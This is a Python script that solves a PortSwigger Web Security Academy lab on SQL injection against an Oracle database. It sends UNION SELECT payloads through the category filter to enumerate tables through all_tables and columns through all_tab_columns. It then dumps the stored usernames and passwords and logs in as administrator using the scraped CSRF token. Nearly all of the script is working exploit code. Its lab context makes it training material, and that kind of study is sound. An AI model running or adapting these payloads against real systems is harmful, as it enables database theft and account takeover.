#!/usr/bin/env python

'''
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.
'''

import requests 
import re
from bs4 import BeautifulSoup
import sys


lab_id = '0a39004103ad768fc01a081d000700d3'  # change based on generated lab page id
uri = f"https://{lab_id}.web-security-academy.net/filter?category=" # contains the vulnerable sqli path
s = requests.Session()

# Using sqli query "'+UNION+SELECT+NULL,NULL--" to do the extractions (with changes for oracle variant)

def extract_user_table(sqli_query: str) -> str:
    q_uri = uri + sqli_query
    resp = s.get(q_uri)
    parse = BeautifulSoup(resp.text, 'lxml')
    for tr in parse.findAll('tr'):
        if re.search(r'USERS_[A-Z]{6}$', tr.text.strip(), re.IGNORECASE): # Regex will search for the user_table from the striped html table data via query response. Table format is in *USERS_XXXXXX*.
            print(f"Found users table: '{tr.text.strip()}'")
            return tr.text.strip()
    print("Can't find the proper user table. Check query/search parameters. Exiting")
    sys.exit(-1)
   

def extract_user_columns(sqli_query: str) -> list:
    columns = []
    q_uri = uri + sqli_query
    resp = s.get(q_uri)
    parse = BeautifulSoup(resp.text, 'lxml')
    for tr in parse.findAll('tr'):
        if re.search(r'username_[a-z]{6}$', tr.text.strip(), re.IGNORECASE) or re.search(r'password_[a-z]{6}$', tr.text.strip(), re.IGNORECASE): # Regex will search columns of the users table for username/password entries. Column format is in *USERNAME_XXXXXX*".
            columns.append(tr.text.strip())
    if len(columns) == 2:
        print(f"Found column entries: '{columns[0]}' and '{columns[1]}'")
        columns.sort(reverse=True) # Just so the username will come first in the array for future processing
        return columns 
    else:
        print("Can't find the proper user columns. Check query/search parameters. Exiting")
        sys.exit(-1)


def extract_user_creds(sqli_query: str) -> str:
    creds = {}
    q_uri = uri + sqli_query
    resp = s.get(q_uri)
    parse = BeautifulSoup(resp.text, 'lxml')
    for tr in parse.findAll('tr'):
        key = tr.text.split()[0]
        value = tr.text.split()[1]
        creds[key] = value
    if creds:
        print(f"Found credentials: {creds}")
        return creds
    else: 
        print("Can't find the user creds. Check query/search parameters. Exiting")
        sys.exit(-1)


def login(username: str,password: str) -> None: 
    login_uri = f"https://{lab_id}.web-security-academy.net/login"
    resp = s.get(login_uri) 
    parse = BeautifulSoup(resp.text, 'lxml')
    token = parse.find('input', {'name': 'csrf'})['value'] #csrf token

    data = { 'username' : username,
        'password' : password,
        'csrf': token
    }
 
    print(f"Attempting to login with user: {username}")
    resp_2 = s.post(login_uri, data=data)
    if "Your username is: administrator" in resp_2.text:
        print("solved")
    else:
        print("nope")


def main() -> None:
    query_tables = "'+UNION+SELECT+table_name,NULL+FROM+all_tables--" # The first query we will send will get info about the sql tablee, to look for the table that has users in it.
    user_table = extract_user_table(query_tables)
    query_columns =  f"'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='{user_table}'--"  # The second query will get the column name from the table we found in the first query. Username and password columns expected
    user_columns = extract_user_columns(query_columns)
    query_creds = f"'+UNION+SELECT+{user_columns[0]},{user_columns[1]}+FROM+{user_table}--" # The third query will get the creds username/password columns of the user table
    user_creds = extract_user_creds(query_creds)
    login('administrator',user_creds['administrator']) # Now login as administrator to complete the lab
    s.close()


if __name__ == "__main__":
    main()